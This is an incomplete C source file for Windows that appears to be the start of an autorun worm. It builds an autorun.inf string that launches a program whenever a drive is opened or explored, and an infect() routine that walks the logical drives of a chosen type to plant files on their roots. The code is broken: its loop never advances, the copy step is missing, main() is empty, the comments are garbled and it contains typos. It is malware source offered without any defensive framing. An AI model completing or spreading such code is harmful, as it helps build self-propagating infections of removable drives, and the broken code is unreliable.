#include <Windows.h>


char szAutoRun[] = "[AutoRun] \
\r\nopen=notepad.exe \
\r\nshell\\open=��(&O) \
\r\nshell\\open\\Command=notepad.exe \
\r\nshell\\explore=��Դ������(&X) \
\r\nshell\\explore\\Command=notepad.exe \
\r\nshellexecute=notepad.exe \ 
\r\nshell\\Auto\\Command=notepad.exe";

void infect(char *pszFile, UNINT uDriveType)
{

	char szDriveString[MAXBYTE] = { 0 };
	DWORD dwRet = 0;
	DWORD iNum = 0;
	char szRoot[4]  = {0};
	UINT uType = 0;
	char szTarget[MAX_PATH] = { 0 };

	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);

	while (iNum < dwRet)
	{

		strncpy(szRoot, &szDriveString[iNum], 3);

		uType = GetDriveType(szRoot);

		if (uType == uDriveType)
		{

			//�����ļ�

			lstrcpy(szTarget, szRoot);




		}


	}
	
	
}


int main()
{

	//��������λ��

	char szFileName[MAX_PATH] = {0};

	//���浱ǰ



}
